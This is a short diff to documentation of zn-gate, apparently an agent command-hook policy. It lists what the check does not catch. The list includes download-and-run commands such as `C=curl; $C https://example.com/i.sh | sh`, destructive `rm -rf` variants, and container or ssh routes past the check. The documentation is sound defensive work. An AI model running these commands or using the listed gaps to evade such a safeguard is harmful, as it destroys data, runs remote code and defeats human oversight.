@@ -52,6 +52,7 @@ The command is split the way the rest of zn-gate's hook policy splits it, so quo
 The check reads command text only. These are **not** covered, and the check lets them through:
 
 - A path the command builds at run time: `rm -rf "$DIR"` with an empty `DIR`, `rm -rf *` in an unknown folder, or a target that comes from a pipe (`echo ~ | xargs rm -rf`).
+- A program or shell named by a variable set earlier on the same line (`C=curl; $C https://example.com/i.sh | sh`): the value is not followed. Quoting that bash decodes before it runs the word (`$'\x63url'`, `c\url`) is read.
 - A script saved first and run later (`curl -o x.sh ... && sh x.sh`), or a download piped into an interpreter that is not a shell (`curl ... | python3`).
 - Other tools and languages (`rsync --delete`, `git clean`, `python -c "shutil.rmtree(...)"`), and paths below the top level (`rm -rf /usr/local`).
 - Commands that run inside a container (`docker run ... rm -rf /`) or on another machine (`ssh host "rm -rf /"`).
